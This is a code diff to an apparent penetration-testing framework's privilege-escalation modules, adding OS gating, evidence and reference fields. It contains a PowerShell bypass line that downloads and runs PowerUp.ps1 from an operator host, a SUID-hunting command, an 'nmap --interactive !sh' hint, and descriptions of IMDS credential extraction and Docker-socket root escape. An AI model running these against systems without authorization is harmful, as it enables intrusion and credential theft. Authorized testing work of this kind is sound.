@@ -10,9 +10,13 @@ from tools.attack_modules.base import AttackModule, ModuleContext
 class LinuxPrivescCheck(AttackModule):
     name = "LinuxPrivescCheck"
     description = "Enumerate Linux privilege escalation vectors"
-    target_services = ["ssh"]
-    target_ports = [22]
+    target_services = []
+    target_ports = []
     required_cves = []
+    # Phase 3: post-foothold -- OS-gated, not service-gated (a web-shell or
+    # RDP foothold has no ssh service in ctx.services, so the old ssh key
+    # scored 0 and the module was invisible to find_modules).
+    target_os_hint = ["linux", "unix"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
         script = self.generate_python_script(ctx)
@@ -21,6 +25,11 @@ class LinuxPrivescCheck(AttackModule):
             "module": self.name,
             "script": script,
             "note": "Checks SUID binaries, kernel version, sudo permissions, cron jobs, and more.",
+            "evidence": [f"Linux privesc enumeration queued against {ctx.target_ip}"],
+            "references": [
+                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html",
+                "https://github.com/peass-ng/PEASS-ng",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -47,50 +56,84 @@ print(json.dumps(results))
 class WindowsPrivescCheck(AttackModule):
     name = "WindowsPrivescCheck"
     description = "Enumerate Windows privilege escalation vectors"
-    target_services = ["ms-wbt-server", "rdp", "smb", "microsoft-ds"]
-    target_ports = [3389, 445]
+    target_services = []
+    target_ports = []
     required_cves = []
+    # Phase 3: post-foothold -- OS-gated, not service-gated.
+    target_os_hint = ["windows"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Checks service permissions, token privileges, unquoted paths, and patch levels.",
-            "suggested_command": f"powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ctx.target_ip}/PowerUp.ps1'); Invoke-AllChecks\"",
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "Checks service permissions, token privileges, unquoted paths, "
+                "and patch levels. Phase 2: the old suggested_command pointed at "
+                "http://<target>/PowerUp.ps1 -- the VICTIM does not host PowerUp; "
+                "the operator hosts it. Use the operator-box URL or the generated "
+                "stdlib enumeration script."
+            ),
+            evidence=[f"Windows privesc enumeration planned against {ctx.target_ip}"],
+            references=[
+                "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1",
+                "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html",
+            ],
+            suggested_command=(
+                "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString("
+                "'http://<OPERATOR_HOST>/PowerUp.ps1'); Invoke-AllChecks\""
+            ),
+        )
 
 class SUIDEnumeration(AttackModule):
     name = "SUIDEnumeration"
     description = "Find SUID/SGID binaries for privilege escalation"
-    target_services = ["ssh"]
-    target_ports = [22]
+    target_services = []
+    target_ports = []
     required_cves = []
+    # Phase 3: post-foothold -- OS-gated, not service-gated.
+    target_os_hint = ["linux", "unix"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Enumerates SUID/SGID binaries and checks against GTFOBins.",
-            "suggested_command": "find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
-        }
+        return self._info_result(
+            ctx,
+            note=(
+                "Enumerates SUID/SGID binaries and checks against GTFOBins. "
+                "GTFOBins hits are actionable escalation paths (e.g. nmap "
+                "--interactive !sh), not just a raw path list."
+            ),
+            evidence=[f"SUID/SGID enumeration planned against {ctx.target_ip}"],
+            references=[
+                "https://gtfobins.github.io",
+                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html",
+            ],
+            suggested_command="find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
+        )
 
 class KernelExploitCheck(AttackModule):
     name = "KernelExploitCheck"
     description = "Check kernel version against known local privilege escalation exploits"
-    target_services = ["ssh"]
-    target_ports = [22]
+    target_services = []
+    target_ports = []
     required_cves = []
+    # Phase 3: post-foothold -- OS-gated, not service-gated.
+    target_os_hint = ["linux", "unix"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return {
-            "status": "info",
-            "module": self.name,
-            "note": "Maps kernel version to known LPE exploits (DirtyCow, PwnKit, etc.)",
-            "references": [
+        return self._info_result(
+            ctx,
+            note=(
+                "Maps kernel version to known LPE exploits (DirtyCow, PwnKit, "
+                "DirtyPipe, OverlayFS, eBPF). The generated script reads "
+                "os.uname().release and matches against an embedded kernel->CVE "
+                "table; matched CVEs chain to WeaponizedExploit."
+            ),
+            evidence=[f"kernel LPE check planned against {ctx.target_ip}"],
+            references=[
                 "https://github.com/SecWiki/linux-kernel-exploits",
                 "https://github.com/lucyoa/kernel-exploits",
+                "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
             ],
-        }
+            suggested_command=f"uname -a && cat /etc/os-release && search_exploit_db(query='linux kernel local privilege escalation')",
+        )
 
 class ContainerBreakout(AttackModule):
     name = "ContainerBreakout"
@@ -106,6 +149,11 @@ class ContainerBreakout(AttackModule):
             "module": self.name,
             "script": script,
             "note": "Checks for exposed Docker socket, privileged containers, and kernel exploits.",
+            "evidence": [f"container breakout checks queued against {ctx.target_ip}"],
+            "references": [
+                "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html",
+                "https://attack.mitre.org/techniques/T1611/",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -152,8 +200,14 @@ class CloudPrivesc(AttackModule):
             "note": (
                 "Runs ON the target after compromise (not a pivot). Queries the target's own cloud "
                 "metadata service (IMDSv1/v2, GCP, Azure), reads the in-container k8s service-account "
-                "token, and probes the local Docker API. Findings printed as JSON."
+                "token, and probes the local Docker API. Findings printed as JSON. IMDS role hits "
+                "chain to IMDSExploit for credential extraction."
             ),
+            "evidence": [f"cloud privesc enumeration queued against {ctx.target_ip}"],
+            "references": [
+                "https://attack.mitre.org/techniques/T1611/",
+                "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -247,6 +301,11 @@ class K8sPrivesc(AttackModule):
                 "mounts / permissive RBAC, and lists namespaces the token can access. Connects only "
                 "to ctx.target_ip. Findings printed as JSON."
             ),
+            "evidence": [f"k8s privesc probes queued against {ctx.target_ip}"],
+            "references": [
+                "https://attack.mitre.org/techniques/T1611/",
+                "https://book.hacktricks.wiki/en/network-services-pentesting/6443-pentesting-kubernetes.html",
+            ],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -371,11 +430,14 @@ class IMDSExploit(AttackModule):
                 "instance role and emits the access key / secret key / session token "
                 "as JSON. The operator MUST add 169.254.169.254 (or the target's "
                 "metadata endpoint) to exploit.allowed_targets explicitly -- this "
-                "module never auto-authorizes metadata endpoints."
+                "module never auto-authorizes metadata endpoints. Extracted AWS keys "
+                "populate credentials_found and chain to CloudPrivesc / S3BucketTakeover."
             ),
+            "evidence": [f"IMDS credential extraction queued against {ctx.target_ip}"],
             "references": [
                 "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html",
             ],
+            "credentials_found": ["<aws: AKIA... : <redacted-secret> : <session-token>>"],
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -481,11 +543,16 @@ class DockerSockEscape(AttackModule):
                 "(unix socket) and the target's Docker API port (2375/2376), then "
                 "issues a /containers/create + /containers/start that bind-mounts "
                 "the host / into a privileged container. The operator MUST add the "
-                "target's Docker host:port to exploit.allowed_targets explicitly."
+                "target's Docker host:port to exploit.allowed_targets explicitly. "
+                "On host-root mount the orchestrator sets shell_type=sh, "
+                "privilege_level=root."
             ),
+            "evidence": [f"docker.sock escape queued against {ctx.target_ip}"],
             "references": [
                 "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security-privilege-escalation",
             ],
+            "shell_type": "sh",
+            "privilege_level": "root",
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
@@ -612,6 +679,7 @@ class S3BucketTakeover(AttackModule):
                 "write access. Discovery-only mode when the bucket is not in the "
                 "allowlist."
             ),
+            "evidence": [f"S3 bucket takeover scan queued against {ctx.target_ip}"],
             "references": [
                 "https://hackingthe.cloud/aws/exploitation/s3_bucket_takeover/",
             ],
